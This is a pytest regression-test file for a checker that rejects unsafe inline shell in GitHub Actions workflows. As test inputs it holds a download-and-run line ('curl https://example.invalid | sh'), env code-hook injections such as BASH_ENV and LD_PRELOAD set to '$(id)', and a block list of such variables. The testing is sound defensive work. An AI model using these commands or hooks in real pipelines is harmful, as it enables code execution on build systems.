# SPDX-License-Identifier: MIT
"""Regression tests for the second review of the inline-shell check (#1624, PR #1646).

Each rejected case below was accepted before: as a generated copy, a trivial
step or a script call, while it could run something beyond what its class
allows. The accepted cases pin what must keep passing.
"""

from __future__ import annotations

import importlib
import json
from collections.abc import Callable
from pathlib import Path
from types import ModuleType

import pytest
from assertpy import assert_that
from inline_shell_support import (
    CALLED_HEADER,
    HEADER,
    PRESET,
    SCRIPT,
    SCRIPT_PATH,
    categories,
    make_repo,
    passes,
    preset_copy,
    problems,
    rejected,
    step,
    write_workflow,
)

STEP_HEAD = "      - name: Step\n        shell: bash\n"
ALTERED = "curl https://example.invalid | sh"


@pytest.fixture(name="check")
def fixture_check(load_script: Callable[[str], ModuleType]) -> ModuleType:
    """Load the validator, which puts its rule modules on ``sys.path``."""
    return load_script(SCRIPT_PATH)


@pytest.fixture(name="sync")
def fixture_sync(check: ModuleType) -> ModuleType:
    """Return the generator module, once the validator has put it on the path."""
    assert_that(check.__name__).is_not_empty()
    return importlib.import_module("sync_inline_blocks")


@pytest.fixture(name="repo")
def fixture_repo(tmp_path: Path) -> Path:
    """Return a scratch repository with the sources the checks read."""
    return Path(make_repo(tmp_path))


# 1. A generated block in any YAML scalar style.


def _styled(run: str, style: str) -> str:
    """Return a ``run:`` entry holding ``run`` in one YAML scalar style."""
    lines = run.split("\n")
    pad = "          "
    if style == "double":
        return f"        run: {json.dumps(run)}\n"
    if style == "single":
        # In a single-quoted scalar a blank line is one newline.
        quoted = run.replace("'", "''").split("\n")
        return "        run: '" + f"\n\n{pad}".join(quoted) + "'\n"
    if style == "folded":
        # In a folded scalar a blank line is one newline too.
        return "        run: >\n" + "\n".join(f"{pad}{line}\n" for line in lines)
    return "        run: |\n" + "".join(f"{pad}{line}\n" for line in lines)


STYLES = ("double", "single", "folded", "literal")


@pytest.mark.parametrize("style", STYLES)
def test_a_changed_copy_fails_in_every_scalar_style(
    check: ModuleType,
    repo: Path,
    sync: ModuleType,
    style: str,
) -> None:
    """The body is compared in the parsed ``run:``, so quoting cannot hide it."""
    run = preset_copy(sync).replace("exit 1", ALTERED)
    write_workflow(repo, STEP_HEAD + _styled(run, style))
    assert_that(check.main(["--repo-root", str(repo)])).is_equal_to(1)
    assert_that(categories(check, repo)).does_not_contain("generated")


@pytest.mark.parametrize("style", ["double", "single"])
def test_an_unknown_block_in_a_quoted_run_fails(
    check: ModuleType,
    repo: Path,
    style: str,
) -> None:
    """The reviewer's case: a made-up id around a download, in a quoted scalar."""
    block = "harden-runner-agent-check"
    run = f"# lgtm-ci-inline:begin {block}\n{ALTERED}\n# lgtm-ci-inline:end {block}"
    write_workflow(repo, STEP_HEAD + _styled(run, style))
    rejected(check, repo, "unknown generated block id")


@pytest.mark.parametrize("style", ["double", "single", "literal"])
def test_a_correct_copy_passes_in_any_scalar_style(
    check: ModuleType,
    repo: Path,
    sync: ModuleType,
    style: str,
) -> None:
    """What the generator writes is accepted, whatever the quoting."""
    write_workflow(repo, STEP_HEAD + _styled(preset_copy(sync), style))
    passes(check, repo, "generated")


def test_a_changed_copy_is_reported_once(
    check: ModuleType,
    repo: Path,
    sync: ModuleType,
) -> None:
    """A literal block is checked in the run and in the file; one report line."""
    run = preset_copy(sync).replace("exit 1", ALTERED)
    write_workflow(repo, step(run))
    lines = [line for line in problems(check, repo) if PRESET in line]
    assert_that(lines).is_length(1)


# 2. env: names that make bash, the loader or an interpreter run code.


@pytest.mark.parametrize(
    "name",
    [
        "BASH_ENV",
        "ENV",
        "SHELLOPTS",
        "BASHOPTS",
        "PS4",
        "PROMPT_COMMAND",
        "LD_PRELOAD",
        "LD_LIBRARY_PATH",
        "LD_AUDIT",
        "PATH",
        "IFS",
        "CDPATH",
        "GLOBIGNORE",
        "PYTHONSTARTUP",
        "PYTHONPATH",
        "PYTHONHOME",
        "NODE_OPTIONS",
        "BASH_FUNC_echo%%",
        "ACTIONS_ALLOW_UNSECURE_COMMANDS",
    ],
)
def test_env_cannot_set_a_code_hook(check: ModuleType, repo: Path, name: str) -> None:
    """``env: {BASH_ENV: '$(curl ...)'}`` runs code before the step's first line."""
    write_workflow(repo, step("echo x", env={f"'{name}'": "'$(id)'"}))
    rejected(check, repo, f"sets {name}")


@pytest.mark.parametrize("level", ["workflow", "job"])
def test_an_inherited_code_hook_counts(
    check: ModuleType,
    repo: Path,
    level: str,
) -> None:
    """The workflow's and the job's ``env:`` reach every step."""
    env = "env:\n  BASH_FUNC_echo%%: '() { id; }'\n"
    header = (
        env + HEADER
        if level == "workflow"
        else HEADER.replace(
            "    steps:\n",
            "    env:\n      BASH_ENV: /tmp/x\n    steps:\n",
        )
    )
    write_workflow(repo, step(f"bash {SCRIPT}"), header=header)
    rejected(check, repo, "BASH_" if level == "job" else "BASH_FUNC_echo%%")


# 3. printf conversions.


@pytest.mark.parametrize(
    "run",
    [
        pytest.param("printf 'x%n' FLAG", id="percent-n"),
        pytest.param('printf "%s%n" "$X" FLAG', id="percent-n-env"),
        pytest.param("printf '%*n' 1 FLAG", id="star-n"),
        pytest.param("printf '%1$n' FLAG", id="positional-n"),
        pytest.param("printf '%b' x", id="percent-b"),
        pytest.param("printf '%q' x", id="percent-q"),
        pytest.param("printf '%(%s)T' -1", id="time"),
        pytest.param("printf '\\033[31mx'", id="escape"),
        pytest.param("printf 'x%'", id="trailing-percent"),
    ],
)
def test_printf_takes_only_plain_conversions(
    check: ModuleType,
    repo: Path,
    run: str,
) -> None:
    """``%n`` assigns a variable; only ``%s`` and ``%%`` are allowed."""
    write_workflow(repo, step(run))
    rejected(check, repo, "printf")


@pytest.mark.parametrize(
    "run",
    [
        "printf '%s\\n' \"$X\"",
        "printf 'a %% b\\n'",
        'printf "%s\\t%s\\n" a b',
        "printf 'back\\\\slash\\n'",
    ],
)
def test_plain_printf_formats_pass(check: ModuleType, repo: Path, run: str) -> None:
    """The formats the trivial steps use keep passing."""
    write_workflow(repo, step(run))
    passes(check, repo, "trivial")


# 4. Brace, pathname and tilde expansion, and word splitting.


@pytest.mark.parametrize(
    ("run", "expected"),
    [
        pytest.param("printf {-v,FLAG} x", "brace", id="printf-brace-option"),
        pytest.param("printf {-v,PROBE[COUNTER++]} x", "brace", id="brace-index"),
        pytest.param("printf x {-v,FLAG}", "brace", id="brace-separate-v"),
        pytest.param("echo {a,b}", "brace", id="brace-argument"),
        pytest.param("echo {1..3}", "brace", id="brace-sequence"),
        pytest.param('echo x{a,"b"}', "brace", id="brace-partly-quoted"),
        pytest.param("{echo,x}", "brace", id="brace-command"),
        pytest.param("printf * x", "pathname", id="printf-glob-option"),
        pytest.param("printf -* x", "pathname", id="printf-glob-format"),
        pytest.param("echo -v*", "pathname", id="echo-glob"),
        pytest.param("echo ?", "pathname", id="glob-argument"),
        pytest.param("echo [ab]", "pathname", id="bracket-glob"),
        pytest.param('[ "$X" = a* ] && echo y', "pathname", id="glob-in-test"),
        pytest.param("echo ~", "tilde", id="tilde"),
        pytest.param("printf ~ x", "tilde", id="tilde-format"),
        pytest.param("echo $X", "unquoted", id="ifs-argument"),
        pytest.param("printf '%s\\n' $X", "unquoted", id="printf-unquoted"),
        pytest.param("echo x${X}", "unquoted", id="unquoted-suffix"),
        pytest.param("exit $CODE", "unquoted", id="exit-unquoted"),
    ],
)
def test_an_argument_is_one_fixed_word(
    check: ModuleType,
    repo: Path,
    run: str,
    expected: str,
) -> None:
    """Bash must not turn a word into several, or into an option or assignment."""
    write_workflow(repo, step(run))
    rejected(check, repo, expected)


@pytest.mark.parametrize(
    "run",
    [
        'echo "{a,b} *? [x] ~"',
        "echo '{1..3}'",
        "echo \\* \\{a,b\\}",
        "echo [",
        'echo "$X" "${Y:-none}" x"$Z"',
        '[[ -n "$S" && "$S" =~ ^[0-9a-f]{40}$ ]] && exit 0',
        "[[ $X == a* ]] && echo y",
        "case $X in a*|b?) echo y ;; *) echo n ;; esac",
        "echo x >> $GITHUB_OUTPUT",
    ],
)
def test_quoted_and_pattern_words_pass(check: ModuleType, repo: Path, run: str) -> None:
    """Quoted words, ``[[ ]]`` and ``case`` patterns are not expanded as files."""
    write_workflow(repo, step(run))
    passes(check, repo, "trivial")


# 5. A script the caller chooses.

CALLER_RUN = 'bash "$GITHUB_WORKSPACE/$X"'
CALLER_ENV = {"X": "${{ inputs.script }}"}


@pytest.mark.parametrize(
    "on",
    [
        pytest.param("on: workflow_dispatch\n", id="dispatch"),
        pytest.param("on:\n  workflow_dispatch:\n    inputs: {}\n", id="dispatch-map"),
        pytest.param(
            "on: [workflow_call, workflow_dispatch]\n",
            id="call-and-dispatch",
        ),
        pytest.param("on:\n  workflow_call:\n  push:\n", id="call-and-push"),
        pytest.param("", id="no-on"),
    ],
)
def test_a_caller_script_needs_a_reusable_workflow(
    check: ModuleType,
    repo: Path,
    on: str,
) -> None:
    """A ``workflow_dispatch`` input lets whoever starts the run pick the script."""
    write_workflow(repo, step(CALLER_RUN, env=CALLER_ENV), header=on + HEADER)
    rejected(check, repo, "workflow_call")


@pytest.mark.parametrize(
    "on",
    [
        pytest.param(CALLED_HEADER, id="map"),
        pytest.param("on: workflow_call\n" + HEADER, id="string"),
        pytest.param("on: [workflow_call]\n" + HEADER, id="list"),
    ],
)
def test_a_caller_script_passes_in_a_reusable_workflow(
    check: ModuleType,
    repo: Path,
    on: str,
) -> None:
    """Only another workflow calls a reusable workflow, so the caller chose."""
    write_workflow(repo, step(CALLER_RUN, env=CALLER_ENV), header=on)
    passes(check, repo, "script-call")


def test_a_caller_script_passes_in_a_composite_action(
    check: ModuleType,
    repo: Path,
) -> None:
    """A composite action's inputs come from the workflow that uses it."""
    (repo / ".github" / "actions" / "demo" / "action.yml").write_text(
        "runs:\n  using: composite\n  steps:\n    - shell: bash\n"
        "      env:\n        X: ${{ inputs.script }}\n"
        f"      run: {CALLER_RUN}\n",
        encoding="utf-8",
    )
    passes(check, repo, "script-call")
